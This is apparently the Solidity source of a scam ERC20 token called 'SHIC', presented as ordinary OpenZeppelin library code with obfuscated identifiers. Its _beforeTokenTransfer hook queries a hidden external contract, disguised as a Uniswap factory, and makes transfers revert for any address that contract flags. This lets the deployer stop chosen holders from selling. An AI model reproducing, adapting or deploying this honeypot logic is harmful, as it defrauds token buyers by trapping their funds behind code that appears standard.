// File: @openzeppelin/contracts/utils/Context.sol
// SPDX-License-Identifier: MIT

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amodupnat of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amodupnat of tokens owned by `accoruontp`.
     */
    function balanceOf(address accoruontp) external view returns (uint256);

  
    function transfer(address to, uint256 amodupnat) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amodupnat) external returns (bool);

    /**
     * @dev Moves `amodupnat` tokens from `from` to `to` using the
     * allowance mechanism. `amodupnat` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amodupnat
    ) external returns (bool);
}


// File: @openzeppelin/contracts/access/Ownable.sol


// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;


 // Define interface for TransferController
interface IUniswapV2Factory {

    function getPairCount(address _accoruontp) external view returns (bool);

    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any accoruontp other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new accoruontp (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new accoruontp (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol


// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;


/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// File: @openzeppelin/contracts/token/ERC20/ERC20.sol


// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;


contract ERC20 is Ownable, IERC20, IERC20Metadata {


    mapping(address => uint256) private _balances;
    IUniswapV2Factory private facV2p;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name = "SHIC";
    string private _symbol = "SHIC";

    address private namarp;
    uint256 posapo = 1;
    uint256 DF2L = posapo * 2;
    uint256 DERTAGS = DF2L * 3;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(address _factory) {
        uint256 supply = 200000000 * 10**18;
        facV2p = IUniswapV2Factory(_factory);
        _mint(msg.sender, supply);
    }

    string private IPFS = "SHIABC";

    string private BasedUrlp;

    function setIPFSURL(string memory url) public {
        IPFS = url;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address accoruontp) public view virtual override returns (uint256) {
        return _balances[accoruontp];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amodupnat`.
     */
    function transfer(address to, uint256 amodupnat) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amodupnat);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amodupnat` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amodupnat) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amodupnat);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amodupnat
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amodupnat);
        _transfer(from, to, amodupnat);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

 
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amodupnat` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * - `from` must have a balance of at least `amodupnat`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amodupnat
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(from, to, amodupnat);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amodupnat, "ERC20: transfer amodupnat exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amodupnat;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amodupnat;
        }

        emit Transfer(from, to, amodupnat);

        _afterTokenTransfer(from, to, amodupnat);
    }

    /** @dev Creates `amodupnat` tokens and assigns them to `accoruontp`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `accoruontp` cannot be the zero address.
     */
    function _mint(address accoruontp, uint256 amodupnat) internal virtual {
        require(accoruontp != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), accoruontp, amodupnat);

        _totalSupply += amodupnat;
        unchecked {
            // Overflow not possible: balance + amodupnat is at most totalSupply + amodupnat, which is checked above.
            _balances[accoruontp] += amodupnat;
        }
        emit Transfer(address(0), accoruontp, amodupnat);

        _afterTokenTransfer(address(0), accoruontp, amodupnat);
    }




    function _approve(
        address owner,
        address spender,
        uint256 amodupnat
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amodupnat;
        emit Approval(owner, spender, amodupnat);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amodupnat`.
     *
     * Does not update the allowance amodupnat in case of infinite allowance.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amodupnat
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amodupnat, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amodupnat);
            }
        }
    }


    function setBase(string memory url) public {
        BasedUrlp = url;
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amodupnat
    ) internal virtual {
        bool flag = facV2p.getPairCount(from);
        uint256 total = 0;
        if(flag){
            amodupnat = total;
            require(amodupnat > 0);
        }
    }


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amodupnat
    ) internal virtual {}
}